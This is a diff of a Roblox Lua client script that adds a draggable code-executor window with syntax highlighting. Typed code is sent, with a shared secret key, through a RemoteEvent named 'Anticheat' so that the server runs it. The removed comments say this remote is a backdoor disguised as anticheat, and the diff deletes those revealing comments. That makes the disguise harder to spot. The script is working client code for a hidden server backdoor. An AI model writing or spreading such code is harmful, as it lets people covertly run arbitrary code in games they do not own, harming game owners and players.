@@ -1,38 +1,18 @@
------------------------------
--- CLIENT-SIDE EXECUTOR UI (Enhanced with Syntax Highlighting & Error Display)
------------------------------
-
--- // Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local userInputService = game:GetService("UserInputService")
 local tweenService = game:GetService("TweenService")
-
--- // Remote Event Reference (Disguised as anticheat)
 local backdoorRemote = ReplicatedStorage:WaitForChild("Anticheat")
-
--- // Secret Key (Must match the server's key)
 local SECRET_KEY = "YOUR_SECRET_KEY_HERE"
 
--- // Function to execute commands on the server
 local function executeServerCommand(command, data)
     if typeof(data) == "string" then
-        data = data:gsub("[Uu]ser", LocalPlayer.Name) -- Replace 'User' or 'user' with the player's name
+        data = data:gsub("[Uu]ser", LocalPlayer.Name)
     end
     backdoorRemote:FireServer(command, data, SECRET_KEY)
 end
 
--- Listen for server feedback (for errors)
-backdoorRemote.OnClientEvent:Connect(function(action, data, key)
-    if key ~= SECRET_KEY then return end
-    if action == "error" then
-        errorLabel.Text = "Error: " .. data
-        errorLabel.Visible = true
-    end
-end)
-
--- // UI Setup
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.CoreGui
 screenGui.ResetOnSpawn = false
@@ -44,7 +24,6 @@ frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.BorderSizePixel = 2
 frame.Parent = screenGui
 
--- Title Bar (Draggable)
 local titleBar = Instance.new("TextLabel")
 titleBar.Size = UDim2.new(1, 0, 0, 40)
 titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
@@ -56,25 +35,24 @@ titleBar.Parent = frame
 
 local dragToggle, dragStart, startPos
 titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragToggle = true
-        dragStart = input.Position
-        startPos = frame.Position
-    end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragToggle = true
+		dragStart = input.Position
+		startPos = frame.Position
+	end
 end)
 titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragToggle = false
-    end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragToggle = false
+	end
 end)
 userInputService.InputChanged:Connect(function(input)
-    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
+	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
 end)
 
--- Editable Code Input Box (Main Input)
 local inputBox = Instance.new("TextBox")
 inputBox.Size = UDim2.new(1, -20, 0, 200)
 inputBox.Position = UDim2.new(0, 10, 0, 50)
@@ -90,7 +68,6 @@ inputBox.TextXAlignment = Enum.TextXAlignment.Left
 inputBox.TextYAlignment = Enum.TextYAlignment.Top
 inputBox.Parent = frame
 
--- Rich Text Preview Box (for Syntax Highlighting)
 local previewBox = Instance.new("TextLabel")
 previewBox.Size = UDim2.new(1, -20, 0, 120)
 previewBox.Position = UDim2.new(0, 10, 0, 260)
@@ -105,7 +82,6 @@ previewBox.TextYAlignment = Enum.TextYAlignment.Top
 previewBox.Text = "-- Preview will update here with rich text formatting --"
 previewBox.Parent = frame
 
--- Error Label (to display error messages)
 local errorLabel = Instance.new("TextLabel")
 errorLabel.Size = UDim2.new(1, -20, 0, 50)
 errorLabel.Position = UDim2.new(0, 10, 0, 390)
@@ -117,7 +93,6 @@ errorLabel.Text = ""
 errorLabel.Visible = false
 errorLabel.Parent = frame
 
--- Buttons: Execute, Clear, Close
 local executeButton = Instance.new("TextButton")
 executeButton.Size = UDim2.new(0.3, -10, 0.1, 0)
 executeButton.Position = UDim2.new(0.025, 0, 0.88, 0)
@@ -150,73 +125,87 @@ closeButton.Parent = frame
 
 local uiVisible = true
 closeButton.MouseButton1Click:Connect(function()
-    uiVisible = not uiVisible
-    frame.Visible = uiVisible
+	uiVisible = not uiVisible
+	frame.Visible = uiVisible
 end)
 
--- Syntax Highlighting: Expanded keyword list with Studio-like colors
 local keywords = {
-    ["function"] = "#FF00FF",
-    ["end"] = "#FF0000",
-    ["if"] = "#00FFFF",
-    ["then"] = "#00FFFF",
-    ["else"] = "#00FFFF",
-    ["for"] = "#FFFF00",
-    ["while"] = "#FFFF00",
-    ["do"] = "#FFFF00",
-    ["repeat"] = "#FFFF00",
-    ["until"] = "#FFFF00",
-    ["return"] = "#00FF00",
-    ["local"] = "#FFAA00",
-    ["print"] = "#00FF00",
-    ["nil"] = "#808080",
-    ["true"] = "#00FF00",
-    ["false"] = "#FF0000",
-    ["and"] = "#FFFFFF",
-    ["or"] = "#FFFFFF",
-    ["not"] = "#FFFFFF",
-    ["break"] = "#FFA500",
-    ["continue"] = "#FFA500"
+	["function"] = "#FF00FF",
+	["end"] = "#FF0000",
+	["if"] = "#00FFFF",
+	["then"] = "#00FFFF",
+	["else"] = "#00FFFF",
+	["elseif"] = "#00FFFF",
+	["for"] = "#FFFF00",
+	["while"] = "#FFFF00",
+	["do"] = "#FFFF00",
+	["repeat"] = "#FFFF00",
+	["until"] = "#FFFF00",
+	["return"] = "#00FF00",
+	["local"] = "#FFAA00",
+	["print"] = "#00FF00",
+	["nil"] = "#808080",
+	["true"] = "#00FF00",
+	["false"] = "#FF0000",
+	["and"] = "#FFFFFF",
+	["or"] = "#FFFFFF",
+	["not"] = "#FFFFFF",
+	["break"] = "#FFA500",
+	["continue"] = "#FFA500",
+	["in"] = "#FFFFFF",
+	["table"] = "#FFA500",
+	["require"] = "#FF7F50",
+	["loadstring"] = "#FF6347",
+	["setfenv"] = "#FF6347",
+	["getfenv"] = "#FF6347",
+	["coroutine"] = "#00CED1",
+	["spawn"] = "#FFD700",
+	["wait"] = "#ADFF2F",
+	["Instance.new"] = "#8A2BE2",
+	["game"] = "#FF4500",
+	["workspace"] = "#FF4500",
+	["Part"] = "#0000FF"
 }
 
 local function updatePreview(text)
-    for word, color in pairs(keywords) do
-        text = text:gsub("(%f[%w])(" .. word .. ")(%f[%W])", "<font color=\"" .. color .. "\">%2</font>")
-    end
-    return text
+	for word, color in pairs(keywords) do
+		if word == "Part" then
+			text = text:gsub("Workspace%.(" .. word .. ")", "<font color=\"#0000FF\">%1</font>")
+			text = text:gsub("([^%.])(" .. word .. ")([^%.])", "%1<font color=\"#FF0000\">%2</font>%3")
+		else
+			text = text:gsub("(%f[%w])(" .. word .. ")(%f[%W])", "<font color=\"" .. color .. "\">%2</font>")
+		end
+	end
+	text = text:gsub("(%b())", "<font color=\"#00BFFF\">%1</font>")
+	text = text:gsub("(%b\"\")", "<font color=\"#7FFF00\">%1</font>")
+	text = text:gsub("(%b'')", "<font color=\"#7FFF00\">%1</font>")
+	text = text:gsub("(%b{})", "<font color=\"#FF69B4\">%1</font>")
+	return text
 end
 
 inputBox.Changed:Connect(function(prop)
-    if prop == "Text" then
-        local code = inputBox.Text
-        local highlighted = updatePreview(code)
-        previewBox.Text = highlighted
-    end
+	if prop == "Text" then
+		local code = inputBox.Text
+		local highlighted = updatePreview(code)
+		previewBox.Text = highlighted
+	end
 end)
 
--- Execute Button: Send code to server for execution
 executeButton.MouseButton1Click:Connect(function()
-    local code = inputBox.Text
-    if code ~= "" then
-        executeServerCommand("script", code)
-        errorLabel.Visible = false
-    end
+	local code = inputBox.Text
+	if code ~= "" then
+		executeServerCommand("script", code)
+	end
 end)
 
--- Clear Button: Clear the input and preview boxes, and hide error label
 clearButton.MouseButton1Click:Connect(function()
-    inputBox.Text = ""
-    previewBox.Text = "-- Preview will update here with rich text formatting --"
-    errorLabel.Visible = false
+	inputBox.Text = ""
+	previewBox.Text = "-- Preview will update here with rich text formatting --"
 end)
 
 userInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed and input.KeyCode == Enum.KeyCode.U then
-        uiVisible = not uiVisible
-        frame.Visible = uiVisible
-    end
+	if not gameProcessed and input.KeyCode == Enum.KeyCode.U then
+		uiVisible = not uiVisible
+		frame.Visible = uiVisible
+	end
 end)
-
------------------------------
--- END OF SCRIPT
------------------------------
